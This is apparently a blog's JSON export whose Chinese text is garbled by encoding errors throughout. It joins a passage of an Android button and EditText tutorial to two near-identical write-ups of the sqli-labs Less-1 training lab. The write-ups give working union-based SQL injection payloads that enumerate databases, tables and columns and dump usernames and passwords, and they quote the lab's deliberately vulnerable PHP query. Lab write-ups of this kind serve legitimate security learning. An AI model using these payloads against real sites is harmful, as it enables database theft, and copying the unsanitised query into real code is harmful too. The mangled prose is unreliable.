mBtnTextView=findViewById(R.id.btn_textview);//åœ¨å¸ƒå±€æ–‡ä»¶ä¸­æ‰¾åˆ°å¯¹åº”Buttonç»„ä»¶çš„idï¼› mBtnTextView.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; //äº‹ä»¶ç›‘å¬ï¼Œç‚¹å‡»æŒ‰é’®æ—¶è·³è½¬åˆ°TextViewæ¼”ç¤ºç•Œé¢ Intent intent=new Intent(MainActivity.this,TextViewActivity.class);//æŒ‡å®šè·³è½¬ç›®æ ‡ startActivity(intent); &#125; &#125;); mBtnButton=findViewById(R.id.btn_button); mBtnButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; //è·³è½¬åˆ°Buttonæ¼”ç¤ºç•Œé¢ Intent intent=new Intent(MainActivity.this,ButtonActivity.class);//æŒ‡å®šè·³è½¬ç›®æ ‡ startActivity(intent); &#125; &#125;); &#125;&#125; activity_button.xml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:padding=\"10dp\" &gt; &lt;Button android:id=\"@+id/btn_1\" android:layout_width=\"match_parent\" android:layout_height=\"40dp\" android:text=\"æŒ‰é’®1\" android:textSize=\"20sp\" android:textColor=\"#E91E63\" android:background=\"#FFC107\"/&gt; &lt;Button android:id=\"@+id/btn_2\" android:layout_width=\"match_parent\" android:layout_height=\"40dp\" android:text=\"æŒ‰é’®2\" android:textSize=\"20sp\" android:textColor=\"#E91E63\" android:background=\"@drawable/bg_btn2\" android:layout_below=\"@+id/btn_1\" android:layout_marginTop=\"10dp\"/&gt; &lt;Button android:id=\"@+id/btn_3\" android:layout_width=\"match_parent\" android:layout_height=\"40dp\" android:text=\"æŒ‰é’®3\" android:textSize=\"20sp\" android:textColor=\"#4CAF50\" android:layout_below=\"@id/btn_2\" android:layout_marginTop=\"10dp\" android:background=\"@drawable/bg_btn3\"/&gt; &lt;Button android:id=\"@+id/btn_4\" android:layout_width=\"match_parent\" android:layout_height=\"40dp\" android:text=\"æŒ‰é’®4\" android:textSize=\"20sp\" android:textColor=\"#E91E63\" android:layout_below=\"@id/btn_3\" android:layout_marginTop=\"10dp\" android:background=\"@drawable/bg_btn4\" android:onClick=\"showToast\"/&gt; &lt;TextView android:id=\"@+id/tv_1\" android:layout_width=\"match_parent\" android:layout_height=\"50dp\" android:textColor=\"#F44336\" android:textSize=\"20sp\" android:text=\"æ–‡å­—1\" android:layout_below=\"@id/btn_4\" android:layout_marginTop=\"40dp\" android:background=\"#CDDC39\" android:gravity=\"center\"/&gt;&lt;/RelativeLayout&gt;&lt;!-- android:layout_below=\"@+id/btn_1\"//ä½¿btn_2ä½äºbtn_1çš„ä¸‹æ–¹ android:layout_marginTop=\"10dp\"//ä½¿btn_2çš„ä¸Šæ–¹é—´è·10dp android:gravity=\"center\"//å†…å®¹å¯¹å…¶æ–¹å¼ï¼Œè®¾ä¸ºcenterï¼Œå³â€œæ–‡å­—1â€å‰§ä¸­æ˜¾ç¤º--&gt; æ•ˆæœï¼š å®Œæ•´ä»£ç ï¼š https://download.csdn.net/download/qq_40638006/12363386 +++ EditText å¸¸ç”¨å±æ€§ ç›‘å¬äº‹ä»¶ åˆ¶ä½œç™»é™†ç•Œé¢ æµç¨‹ï¼š åœ¨activity_main.xmlä¸­åˆ›å»ºButtonï¼Œè®¾ç½®idä¸ºbtn_edittext; åœ¨MainActivity.javaä¸­æ³¨å†Œï¼› 1private Button mBtnEditTxet; æ‰¾åˆ°æ§ä»¶id 1mBtnEditTxet=findViewById(R.id.btn_edittext);//åœ¨å¸ƒå±€æ–‡ä»¶ä¸­æ‰¾åˆ°å¯¹åº”Buttonç»„ä»¶çš„idï¼› è®¾ç½®ç›‘å¬äº‹ä»¶ 1234567mBtnEditTxet.setOnClickListener(new View.OnClickListener() &#123;//äº‹ä»¶ç›‘å¬ @Override public void onClick(View v) &#123; //è·³è½¬åˆ°EditTextæ¼”ç¤ºç•Œé¢ &#125; &#125;); åœ¨onClickæ–¹æ³•ä¸­å¡«å†™è·³è½¬å†…å®¹ï¼š 12345public void onClick(View v) &#123; //è·³è½¬åˆ°EditTextæ¼”ç¤ºç•Œé¢ Intent intent=new Intent(MainActivity.this,EditTextActivity.class);//æŒ‡å®šè·³è½¬ç›®æ ‡ startActivity(intent);&#125; æ­¤æ—¶çš„EditTextActivityæˆ‘ä»¬è¿˜æ²¡æœ‰åˆ›å»ºï¼Œæ•…éœ€è¦æ–°å»ºä¸€ä¸ªï¼›æ–°å»ºçš„Activityéƒ½éœ€è¦åœ¨manifestä¸­å£°æ˜ä¸€ä¸‹ï¼ŒAndroid studioå·²ç»å¸®æˆ‘ä»¬è‡ªåŠ¨å£°æ˜äº†ï¼› åœ¨å¯¹åº”çš„å¸ƒå±€æ–‡ä»¶activity_edit_text.xmlä¸­è®¾è®¡å¸ƒå±€EditTextæ ·å¼å±æ€§ ç”±äºç›®å‰ç‰ˆæœ¬é»˜è®¤è¾“å…¥æ¡†ä¸ºä¸€æ ¹æ¨ªçº¿ï¼Œä¸ºå¥½çœ‹èµ·è§æˆ‘ä»¬åˆ©ç”¨ä¹‹å‰Buttonä¸­çš„æ–¹æ³•ä¹Ÿå°†å…¶è®¾ç½®ä¸ºåœ†è§’æˆ–æè¾¹æ ·å¼ ç›´æ¥æ‹·è´ä¸€ä»½ä¹‹å‰çš„bg_btn3.xmlæ–‡ä»¶ï¼Œä¿®æ”¹åç§°ä¸ºbg_username.xml; ç„¶åå†EditTextæ§ä»¶ä¸­ä¿®æ”¹backgroundå³å¯ï¼› 1android:background=\"@drawable/bg_username\" è®¾ç½®å›¾æ ‡ æ–°å»ºdrawableæ–‡ä»¶ç›®å½•ï¼Œå‘½åä¸ºdrawable-xxhdpi; (æ³¨æ„ï¼š1. è‹¥æ–°å»ºåæœªæ˜¾ç¤ºæ–‡ä»¶å¤¹ï¼Œåˆ™å°†æ–‡ä»¶æ¨¡å¼æ”¹ä¸ºProjectï¼› å›¾ç‰‡ç”¨pngæ ¼å¼ï¼Œjpgæ ¼å¼å›¾ç‰‡ä¸èƒ½è®¾ä¸ºé€æ˜ï¼› æ–°å»ºçš„drawable-xxhdpiæ–‡ä»¶åº”è¯¥ä½äºresç›®å½•ä¸‹ä¸drawableç›®å½•ç­‰çº§å¹³è¡Œï¼Œå¦åˆ™å½“æˆ‘ä»¬å¼•ç”¨å›¾æ ‡æ—¶ä¼šæŠ¥é”™ï¼Œä¸èƒ½æ£€ç´¢ï¼›) åˆ›å»ºlogin_Buttonï¼Œå‘½åä¸ºbtn_login å¯ä»¥è°ƒç”¨ä¹‹å‰åˆ›å»ºçš„æŒ‰å‹èƒŒæ™¯æ•ˆæœï¼› ç»™login_Buttonæ·»åŠ ç‚¹å‡»äº‹ä»¶ç›‘å¬ åœ¨EditTextActivity.javaä¸­æ³¨å†Œï¼Œæ‰¾idï¼Œè®¾ç½®ç‚¹å‡»äº‹ä»¶ï¼ˆä¸ä¹‹å‰ä¸€æ ·ï¼‰ï¼› ï¼ˆtip:å½“åŒ…ä¸å­˜åœ¨æ—¶ï¼ŒåŒæ—¶ç‚¹å‡»Alt+Enterå¯è‡ªåŠ¨æ·»åŠ åŒ…ï¼‰ æ­¤å¤„ç»™login_Buttonè®¾ç½®ä¸€ä¸ªç®€å•çš„æ¶ˆæ¯æç¤ºæ¡†ï¼Œä½¿ç”¨Toastæ–¹æ³•ï¼› å°è¯•ç»™EditTextè®¾ç½®ä¸€ä¸ªè¾“å…¥æ–‡å­—åŠ¨æ€ç›‘å¬ åŒæ ·åœ¨EditTextActivity.javaä¸­æ³¨å†Œï¼Œæ‰¾idï¼Œè®¾ç½®åŠ¨æ€å˜åŒ–ç›‘å¬ï¼› å› ä¸ºç›‘å¬å½¢å¼ä¸ä¸€æ ·ï¼Œæ­¤å¤„ä½¿ç”¨addTextChangedListeneræ–¹æ³•ï¼› 123456789101112131415161718mEtUserName=findViewById(R.id.et_1); mEtUserName.addTextChangedListener(new TextWatcher() &#123; @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) &#123;//æ–‡å­—æ”¹å˜ä¹‹å‰ &#125; @Override public void onTextChanged(CharSequence s, int start, int before, int count) &#123;//æ–‡å­—æ”¹å˜æ—¶ Log.d(\"edittext\",s.toString()); &#125; @Override public void afterTextChanged(Editable s) &#123;//æ–‡å­—æ”¹å˜ä¹‹å &#125; &#125;); å®Œæ•´ä»£ç ï¼š https://download.csdn.net/download/qq_40638006/12369102 +++","categories":[],"tags":[]},{"title":"sqli-labs-Page-1-Less-1","slug":"sqli-labsé—¯å…³è®°å½•","date":"2020-02-19T08:45:57.000Z","updated":"2020-02-24T13:24:47.636Z","comments":true,"path":"2020/02/19/sqli-labsé—¯å…³è®°å½•/","link":"","permalink":"https://singlemindedt.github.io/2020/02/19/sqli-labsé—¯å…³è®°å½•/","excerpt":"","text":"[TOC] Page-1(Basic Challenges) Less-1ï¼ˆgetæ–¹å¼-åŸºäºå•å¼•å·-stringå‹ï¼‰æ ¹æ®é¡µé¢æç¤ºï¼š 1Please input the ID as parameter with numeric value å°è¯•é€šè¿‡getæ–¹å¼è¾“å…¥IDå’Œæ•°å€¼å‚æ•°ï¼š[3]:(3)å¯ä»¥çœ‹åˆ°ç»™å‡ºäº†ç›¸åº”çš„login name å’Œpassword;å†æ·»åŠ ä¸€ä¸ªå•å¼•å·çœ‹çœ‹ï¼š 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 å¾—åˆ°äº†æŠ¥é”™ä¿¡æ¯ï¼Œè¯´æ˜æ•°æ®åº“å°†æˆ‘ä»¬æ‰€è¾“å…¥çš„â€œ â€˜ â€å½“ä½œäº†SQLè¯­å¥çš„ä¸€éƒ¨åˆ†å¤„ç†äº† ,å•å¼•å·æœªè¢«è¿‡æ»¤äº§ç”Ÿä¸åŒ¹é…é”™è¯¯ ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä»¥æ­¤é—­åˆå‰é¢å†…å®¹ï¼Œæ¶æ„è¡¥å……åé¢å†…å®¹è¾¾åˆ°SQLæ³¨å…¥ã€‚ æ­¤æ—¶å¤§è‡´å¯ä»¥çŒœæµ‹å‡ºæŸ¥è¯¢è¯­å¥ï¼š 12select * from users where id='$id' LIMIT 0,1//limit 0ï¼Œ1:åªæ˜¾ç¤ºç¬¬ä¸€é¡¹ å†ç¡®è®¤ä¸€ä¸‹æˆ‘ä»¬çš„æƒ³æ³•ï¼ŒæŸ¥è¯¢è¯­å¥æ˜¯å¦è¢«æ‰§è¡Œï¼š1: (4) å¯ä»¥çœ‹åˆ°ç¡®å®è¢«æ‰§è¡Œäº†ï¼› æ­¤æ—¶ï¼Œè¾“å…¥â€“+å°†SQLåé¢çš„è¯­å¥æ³¨é‡Šæ‰ï¼Œé¡µé¢å›æ˜¾æ­£å¸¸ï¼Œè¯æ˜æ˜¯å•å¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼›1: (5) æ³¨æ„ï¼šâ€“ ï¼ˆâ€“ç©ºæ ¼ï¼‰åœ¨SQLå†…è¡¨ç¤ºæ³¨é‡Šï¼Œåœ¨URLä¸­ï¼Œæµè§ˆå™¨ä¼šåœ¨å‘é€è¯·æ±‚çš„æ—¶å€™æŠŠURLæœ«å°¾çš„ç©ºæ ¼èˆå»ï¼Œç”¨â€“+ä»£æ›¿æ—¶ï¼ŒURLè¢«URLç¼–ç åä¼šå˜ä¸ºç©ºæ ¼ï¼ˆ?id=2åçš„å•å¼•å·å¯ä»¥ä¸å†™ï¼‰ï¼› ==æ¥ä¸‹æ¥æŒ‰æµç¨‹çŒœè§£æ•°æ®åº“å†…å®¹ï¼š== çŒœè§£æ•°æ®åº“è¡¨åˆ—æ•° order byï¼š å¯ä»¥çœ‹åˆ°order by 4é¡µé¢å›æ˜¾æŠ¥é”™ï¼Œorder by 3é¡µé¢å›æ˜¾æ­£å¸¸ï¼Œè¯´æ˜è¯¥è¡¨ä¸€å…±æœ‰3åˆ—ï¼› åˆ¤æ–­æ•°æ®æ˜¾ç¤ºä½ é€šè¿‡Payloadï¼š?id=0â€™ union select 1,2,3 â€“+ å¯ä»¥çœ‹åˆ°æœ‰2ï¼Œ3ä¸¤ä¸ªæ˜¾ç¤ºä½ï¼› ä½¿ç”¨è”åˆæŸ¥è¯¢ï¼Œå³union selectæŸ¥è¯¢çš„å‰æå³ä¸ºé¡µé¢æœ‰æ˜¾ç¤ºä½ æ³¨æ„ï¼šidéœ€æ”¹ä¸ºæ•°æ®åº“ä¸­ä¸å­˜åœ¨çš„å€¼ï¼Œä¸€èˆ¬ç”¨-1æˆ–0ï¼ˆç”±äºç¨‹åºåœ¨æ˜¾ç¤ºæ•°æ®æ—¶é€šå¸¸åªä¼šå–ç»“æœä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®ï¼ŒæŸ¥çœ‹æœ¬é¢˜æºç ï¼Œå¯ä»¥çœ‹åˆ°mysql_fetch_arrayï¼ˆï¼‰åªè¢«è°ƒç”¨äº†ä¸€æ¬¡ï¼Œè€Œmysql_fetch_array()å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œæˆ–æ•°å­—æ•°ç»„ï¼Œæˆ–äºŒè€…å…¼æœ‰è¿”å›æ ¹æ®ä»ç»“æœé›†å–å¾—çš„è¡Œç”Ÿæˆçš„æ•°ç»„ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šè¡Œåˆ™è¿”å› falseã€‚æ­¤æ—¶åªéœ€è®©ç¬¬1ä½çš„æŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œå³unionå·¦è¾¹çš„selectå‘½ä»¤æŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œé‚£ä¹ˆunionå³è¾¹çš„æŸ¥è¯¢ç»“æœå°±æˆä¸ºäº†å”¯ä¸€å¯æ‰“å°è¡Œï¼‰ï¼› å…³äºæ˜¾ç¤ºä½çš„è¡¥å……ï¼š å½“æˆ‘ä»¬é€šè¿‡order by çŸ¥é“äº†ç›¸å…³è¡¨çš„åˆ—æ•°ä¸º3ï¼Œå†ä½¿ç”¨union select 1,2,3 â€“+æŸ¥çœ‹æ˜¾ç¤ºä½ï¼Œå›æ˜¾é¡µé¢åªæ˜¾ç¤ºäº†2ï¼Œ3ï¼Œå³è¯´æ˜è¯¥é¡µé¢åªå…è®¸æ˜¾ç¤ºç¬¬2ï¼Œ3ä½ï¼Œä¸æ˜¾ç¤ºå…¶ä»–åˆ—çš„ä¿¡æ¯ã€‚è€Œæ­¤æ—¶æˆ‘ä»¬æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯å°±åªèƒ½é€šè¿‡è¿™ä¸¤ä¸ªæ˜¾ç¤ºä½ï¼Œunion select æŸ¥è¯¢éœ€è¦ä¿è¯å­—æ®µæ•°ä¸€è‡´ï¼Œä¸è¶³çš„è¡¥å……æ•°å­—ï¼ˆMySQLï¼‰æˆ–nullã€‚ç¬¬ä¸€ä½ä¸æ˜¾ç¤ºï¼Œæ‰€ä»¥å°†è¦æŸ¥è¯¢çš„è¯­å¥å†™åœ¨2ï¼Œ3ä½ä¸Šä¾¿å¯å¾—åˆ°å›æ˜¾ã€‚ åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´æ•°æ®åº“ç‰ˆæœ¬ ?id=-1â€™ union select 1,version(),3 â€“+ åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´æ•°æ®åº“å ?id=-1â€™ union select 1,2,database() â€“+ å¾—åˆ°å½“å‰æ•°æ®åº“åä¸ºsecurityï¼› æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“åï¼š ?id=-1â€™ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 â€“+ è¡¥å……ï¼šinformation_schema:æ•°æ®åº“æ˜¯MySQLè‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚å³ä¿¡æ¯æ•°æ®åº“ï¼Œå…¶ä¸­ä¿å­˜ç€å…³äºmysqlæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚æ˜¯ä¸€ä¸ªè™šæ‹Ÿæ•°æ®åº“ï¼Œç‰©ç†ä¸Šå¹¶ä¸å­˜åœ¨ã€‚ schemataè¡¨:å…·æœ‰æ•°æ®åº“ä¸­çš„åº“çš„ä¿¡æ¯ï¼Œè¯¦ç»†è®°å½•äº†æŸä¸ªåº“çš„åç§°ï¼Œé»˜è®¤ç¼–ç ï¼Œæ’åºè§„åˆ™ã€‚ å­—æ®µ è¡¨ç¤º schema_name æ•°æ®åº“å default_character_set_name æ•°æ®åº“ç¼–ç  default_collation_name æ•°æ®åº“æ’åºè§„åˆ™ 1: (11) å¾—åˆ°8ä¸ªæ•°æ®åº“ï¼Œåˆ†åˆ«ä¸ºï¼šinformation_schema,challenges,dvwa,easysql,mysql,performance_schema,security,testï¼› åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´è¡¨åï¼Œæ­¤å¤„æˆ‘ä»¬æŸ¥securityæ•°æ®åº“ä¸­çš„è¡¨å æ–¹æ³•1(é€ä¸ªåˆ—å‡ºè¡¨å) ?id=-1â€™ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 â€“+ æ³¨æ„ï¼šæŸ¥è¯¢information_schemaä¸­çš„ä¿¡æ¯æ—¶ï¼Œä½¿ç”¨whereè¯­å¥ï¼Œé‚£ä¸ªå€¼ä¸èƒ½ç›´æ¥ç”¨å­—æ¯ï¼Œè¦ç”¨å•å¼•å·åŒ…è£¹æˆ–è€…ç”¨å…¶åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œæ•°å€¼ç±»å‹çš„å°±ä¸ç”¨å•å¼•å·äº†ã€‚ 1securityçš„åå…­è¿›åˆ¶è½¬æ¢æ˜¯ï¼š0x7365637572697479 å¯çœ‹åˆ°ï¼Œè¯¥é¡µé¢åªå›æ˜¾äº†ä¸€ä¸ªè¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨limitæ¥ä¾æ¬¡åˆ—ä¸¾ï¼š ?id=-1â€™ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0ï¼Œ1â€“+ [17]:(17) æ–¹æ³•2æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ group_concatå‡½æ•°ï¼Œå°†group byäº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœã€‚ ?id=-1â€™union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=â€™securityâ€™),3â€“+ å¾—åˆ°3ä¸ªè¡¨ï¼Œåˆ†åˆ«ä¸ºï¼šemails,referers,uagents,usersï¼› åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´åˆ—åï¼Œæ­¤å¤„æˆ‘ä»¬æŸ¥è¯¢usersè¡¨é‡Œçš„åˆ— ?id=-1â€™union select 1,(select group_concat(column_name) from information_schema.columns where table_name=â€™usersâ€™),3â€“+ å¾—åˆ°13ä¸ªåˆ—ï¼Œåˆ†åˆ«ä¸ºï¼šuser_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,username,passwordï¼› åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´å­—æ®µï¼Œæ­¤å¤„æˆ‘ä»¬æŸ¥è¯¢usersè¡¨ä¸­usernameå’Œpassword ?id=-1â€™union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)â€“+ æŸ¥è¯¢å…¶ä»–æ•°æ®åº“å†…å®¹åŸºæœ¬åŒä¸Šï¼Œæ­¤å¤„ä¸å†èµ˜è¿°ã€‚ æŸ¥çœ‹æºç ï¼š å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ‰€çŒœæµ‹çš„æŸ¥è¯¢è¯­å¥æ­£ç¡®; 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variables if(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-1","slug":"sqli-labs-Page-1-Less-1","date":"2020-02-19T08:45:57.000Z","updated":"2020-08-04T08:12:55.359Z","comments":true,"path":"2020/02/19/sqli-labs-Page-1-Less-1/","link":"","permalink":"https://singlemindedt.github.io/2020/02/19/sqli-labs-Page-1-Less-1/","excerpt":"","text":"[TOC] Page-1(Basic Challenges) Less-1ï¼ˆGETæ–¹å¼-åŸºäºå•å¼•å·-stringå‹ï¼‰æ ¹æ®é¡µé¢æç¤ºï¼š 1Please input the ID as parameter with numeric value å°è¯•é€šè¿‡getæ–¹å¼è¾“å…¥IDå’Œæ•°å€¼å‚æ•°ï¼š[3]:(3)å¯ä»¥çœ‹åˆ°ç»™å‡ºäº†ç›¸åº”çš„login name å’Œpassword; å†æ·»åŠ ä¸€ä¸ªå•å¼•å·çœ‹çœ‹ï¼š 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 å¾—åˆ°äº†æŠ¥é”™ä¿¡æ¯ï¼Œè¯´æ˜æ•°æ®åº“å°†æˆ‘ä»¬æ‰€è¾“å…¥çš„â€œ â€˜ â€å½“ä½œäº†SQLè¯­å¥çš„ä¸€éƒ¨åˆ†å¤„ç†äº† ,å•å¼•å·æœªè¢«è¿‡æ»¤äº§ç”Ÿä¸åŒ¹é…é”™è¯¯ ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä»¥æ­¤é—­åˆå‰é¢å†…å®¹ï¼Œæ¶æ„è¡¥å……åé¢å†…å®¹è¾¾åˆ°SQLæ³¨å…¥ã€‚ æ­¤æ—¶å¤§è‡´å¯ä»¥çŒœæµ‹å‡ºæŸ¥è¯¢è¯­å¥ï¼š 12select * from users where id='$id' LIMIT 0,1//limit 0ï¼Œ1:åªæ˜¾ç¤ºç¬¬ä¸€é¡¹ å†ç¡®è®¤ä¸€ä¸‹æˆ‘ä»¬çš„æƒ³æ³•ï¼ŒæŸ¥è¯¢è¯­å¥æ˜¯å¦è¢«æ‰§è¡Œï¼š1: (4) å¯ä»¥çœ‹åˆ°ç¡®å®è¢«æ‰§è¡Œäº†ï¼› æ­¤æ—¶ï¼Œè¾“å…¥â€“+å°†SQLåé¢çš„è¯­å¥æ³¨é‡Šæ‰ï¼Œé¡µé¢å›æ˜¾æ­£å¸¸ï¼Œè¯æ˜æ˜¯å•å¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼›1: (5) æ³¨æ„ï¼šâ€“ ï¼ˆâ€“ç©ºæ ¼ï¼‰åœ¨SQLå†…è¡¨ç¤ºæ³¨é‡Šï¼Œåœ¨URLä¸­ï¼Œæµè§ˆå™¨ä¼šåœ¨å‘é€è¯·æ±‚çš„æ—¶å€™æŠŠURLæœ«å°¾çš„ç©ºæ ¼èˆå»ï¼Œç”¨â€“+ä»£æ›¿æ—¶ï¼ŒURLè¢«URLç¼–ç åä¼šå˜ä¸ºç©ºæ ¼ï¼ˆ?id=2åçš„å•å¼•å·å¯ä»¥ä¸å†™ï¼‰ï¼› ==æ¥ä¸‹æ¥æŒ‰æµç¨‹çŒœè§£æ•°æ®åº“å†…å®¹ï¼š== çŒœè§£æ•°æ®åº“è¡¨åˆ—æ•° order byï¼š *order byä¼šå¯¹è¡¨è¿›è¡Œæ’åº å¯ä»¥çœ‹åˆ°order by 4é¡µé¢å›æ˜¾æŠ¥é”™ï¼Œorder by 3é¡µé¢å›æ˜¾æ­£å¸¸ï¼Œè¯´æ˜è¯¥è¡¨ä¸€å…±æœ‰3åˆ—ï¼› åˆ¤æ–­æ•°æ®æ˜¾ç¤ºä½ é€šè¿‡Payloadï¼š?id=0â€™ union select 1,2,3 â€“+ å¯ä»¥çœ‹åˆ°æœ‰2ï¼Œ3ä¸¤ä¸ªæ˜¾ç¤ºä½ï¼› ä½¿ç”¨è”åˆæŸ¥è¯¢ï¼Œå³union selectæŸ¥è¯¢çš„å‰æå³ä¸ºé¡µé¢æœ‰æ˜¾ç¤ºä½ æ³¨æ„ï¼šidéœ€æ”¹ä¸ºæ•°æ®åº“ä¸­ä¸å­˜åœ¨çš„å€¼ï¼Œä¸€èˆ¬ç”¨-1æˆ–0ï¼ˆç”±äºç¨‹åºåœ¨æ˜¾ç¤ºæ•°æ®æ—¶é€šå¸¸åªä¼šå–ç»“æœä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®ï¼ŒæŸ¥çœ‹æœ¬é¢˜æºç ï¼Œå¯ä»¥çœ‹åˆ°mysql_fetch_arrayï¼ˆï¼‰åªè¢«è°ƒç”¨äº†ä¸€æ¬¡ï¼Œè€Œmysql_fetch_array()å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œæˆ–æ•°å­—æ•°ç»„ï¼Œæˆ–äºŒè€…å…¼æœ‰è¿”å›æ ¹æ®ä»ç»“æœé›†å–å¾—çš„è¡Œç”Ÿæˆçš„æ•°ç»„ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šè¡Œåˆ™è¿”å› falseã€‚æ­¤æ—¶åªéœ€è®©ç¬¬1ä½çš„æŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œå³unionå·¦è¾¹çš„selectå‘½ä»¤æŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œé‚£ä¹ˆunionå³è¾¹çš„æŸ¥è¯¢ç»“æœå°±æˆä¸ºäº†å”¯ä¸€å¯æ‰“å°è¡Œï¼‰ï¼› å…³äºæ˜¾ç¤ºä½çš„è¡¥å……ï¼š å½“æˆ‘ä»¬é€šè¿‡order by çŸ¥é“äº†ç›¸å…³è¡¨çš„åˆ—æ•°ä¸º3ï¼Œå†ä½¿ç”¨union select 1,2,3 â€“+æŸ¥çœ‹æ˜¾ç¤ºä½ï¼Œå›æ˜¾é¡µé¢åªæ˜¾ç¤ºäº†2ï¼Œ3ï¼Œå³è¯´æ˜è¯¥é¡µé¢åªå…è®¸æ˜¾ç¤ºç¬¬2ï¼Œ3ä½ï¼Œä¸æ˜¾ç¤ºå…¶ä»–åˆ—çš„ä¿¡æ¯ã€‚è€Œæ­¤æ—¶æˆ‘ä»¬æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯å°±åªèƒ½é€šè¿‡è¿™ä¸¤ä¸ªæ˜¾ç¤ºä½ï¼Œunion select æŸ¥è¯¢éœ€è¦ä¿è¯å­—æ®µæ•°ä¸€è‡´ï¼Œä¸è¶³çš„è¡¥å……æ•°å­—ï¼ˆMySQLï¼‰æˆ–nullã€‚ç¬¬ä¸€ä½ä¸æ˜¾ç¤ºï¼Œæ‰€ä»¥å°†è¦æŸ¥è¯¢çš„è¯­å¥å†™åœ¨2ï¼Œ3ä½ä¸Šä¾¿å¯å¾—åˆ°å›æ˜¾ã€‚ åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´æ•°æ®åº“ç‰ˆæœ¬ ?id=-1â€™ union select 1,version(),3 â€“+ åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´æ•°æ®åº“å ?id=-1â€™ union select 1,2,database() â€“+ å¾—åˆ°å½“å‰æ•°æ®åº“åä¸ºsecurityï¼› æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“åï¼š ?id=-1â€™ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 â€“+ è¡¥å……ï¼š information_schema:æ•°æ®åº“æ˜¯MySQLè‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚å³ä¿¡æ¯æ•°æ®åº“ï¼Œå…¶ä¸­ä¿å­˜ç€å…³äºmysqlæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚æ˜¯ä¸€ä¸ªè™šæ‹Ÿæ•°æ®åº“ï¼Œç‰©ç†ä¸Šå¹¶ä¸å­˜åœ¨ã€‚ schemataè¡¨:å…·æœ‰æ•°æ®åº“ä¸­çš„åº“çš„ä¿¡æ¯ï¼Œè¯¦ç»†è®°å½•äº†æŸä¸ªåº“çš„åç§°ï¼Œé»˜è®¤ç¼–ç ï¼Œæ’åºè§„åˆ™ã€‚ å­—æ®µ è¡¨ç¤º schema_name æ•°æ®åº“å 